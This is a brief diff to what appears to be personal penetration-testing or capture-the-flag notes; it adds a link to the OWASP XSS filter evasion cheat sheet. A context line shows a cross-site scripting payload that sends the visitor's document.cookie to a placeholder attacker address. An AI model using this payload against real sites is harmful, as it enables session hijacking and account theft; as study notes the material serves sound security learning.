@@ -67,3 +67,7 @@ webup
 webup
 <script>window.location='http://<ip>:port/?cookie=' + document.cookie</script>
 ```
+
+### links
+
+- [xss cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
